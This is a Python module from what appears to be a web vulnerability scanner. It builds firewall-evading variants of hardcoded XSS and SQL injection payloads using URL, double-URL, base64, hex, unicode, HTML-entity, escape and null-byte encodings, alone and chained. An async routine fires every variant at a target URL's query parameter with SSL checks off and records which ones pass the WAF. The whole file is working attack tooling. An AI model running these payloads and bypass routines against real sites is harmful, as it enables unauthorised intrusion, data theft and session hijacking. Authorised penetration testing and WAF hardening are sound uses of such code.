"""Payload Encoder/Decoder — multi-layer WAF evasion encoding engine."""

import base64
import html
import urllib.parse
from modules.core import console

ENCODERS = {
    'url': lambda s: urllib.parse.quote(s, safe=''),
    'double_url': lambda s: urllib.parse.quote(urllib.parse.quote(s, safe=''), safe=''),
    'base64': lambda s: base64.b64encode(s.encode()).decode(),
    'hex': lambda s: ''.join(f'%{ord(c):02x}' for c in s),
    'unicode': lambda s: ''.join(f'\\u{ord(c):04x}' for c in s),
    'html_entities': lambda s: ''.join(f'&#{ord(c)};' for c in s),
    'html_hex': lambda s: ''.join(f'&#x{ord(c):x};' for c in s),
    'octal': lambda s: ''.join(f'\\{ord(c):03o}' for c in s),
    'js_escape': lambda s: ''.join(f'\\x{ord(c):02x}' for c in s),
    'css_escape': lambda s: ''.join(f'\\{ord(c):06x}' for c in s.replace(' ', '')),
    'case_swap': lambda s: s.swapcase(),
    'null_byte': lambda s: '%00'.join(s),
    'tab_insert': lambda s: '%09'.join(s),
    'newline_insert': lambda s: '%0a'.join(s),
}

XSS_TEMPLATES = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    "javascript:alert(1)",
    "'-alert(1)-'",
]

SQLI_TEMPLATES = [
    "' OR 1=1--",
    "' UNION SELECT NULL--",
    "1' AND '1'='1",
    "admin'--",
]


def encode_payload(payload, encoding):
    """Encode a payload with a specific encoding."""
    encoder = ENCODERS.get(encoding)
    if encoder:
        return encoder(payload)
    return payload


def multi_encode(payload, encodings):
    """Apply multiple encodings in sequence."""
    result = payload
    for enc in encodings:
        result = encode_payload(result, enc)
    return result


def generate_waf_bypass_variants(payload):
    """Generate multiple WAF bypass variants of a payload."""
    variants = []

    for name, encoder in ENCODERS.items():
        try:
            encoded = encoder(payload)
            if encoded != payload:
                variants.append({
                    'encoding': name,
                    'payload': encoded,
                    'layers': 1,
                })
        except Exception:
            pass

    multi_combos = [
        ['url', 'base64'],
        ['double_url'],
        ['unicode', 'url'],
        ['html_entities'],
        ['hex'],
        ['js_escape'],
        ['url', 'html_entities'],
    ]

    for combo in multi_combos:
        try:
            result = payload
            for enc in combo:
                result = encode_payload(result, enc)
            variants.append({
                'encoding': '+'.join(combo),
                'payload': result,
                'layers': len(combo),
            })
        except Exception:
            pass

    return variants


async def scan_with_encoded_payloads(session, url, payload_type='xss'):
    """Test encoded payloads against target."""
    import aiohttp

    console.print(f"\n[bold cyan]--- Payload Encoder Engine ---[/bold cyan]")

    templates = XSS_TEMPLATES if payload_type == 'xss' else SQLI_TEMPLATES

    results = {'bypasses': [], 'total_variants': 0}

    for template in templates:
        variants = generate_waf_bypass_variants(template)
        results['total_variants'] += len(variants)

        for variant in variants:
            try:
                async with session.get(url, params={'q': variant['payload']},
                                       timeout=aiohttp.ClientTimeout(total=5),
                                       ssl=False) as resp:
                    body = await resp.text()

                    if resp.status != 403 and template[:10] in body:
                        results['bypasses'].append({
                            'type': f'WAF Bypass ({payload_type.upper()})',
                            'encoding': variant['encoding'],
                            'original': template[:40],
                            'encoded': variant['payload'][:60],
                            'severity': 'High',
                        })
                        console.print(f"  [red]⚠ Bypass: {variant['encoding']} → passed WAF[/red]")
            except Exception:
                pass

    console.print(f"\n  [bold]Tested {results['total_variants']} encoded variants[/bold]")

    if results['bypasses']:
        console.print(f"  [bold red]{len(results['bypasses'])} WAF bypasses found![/bold red]")
    else:
        console.print(f"  [green]✓ All payloads blocked or no WAF[/green]")

    return results
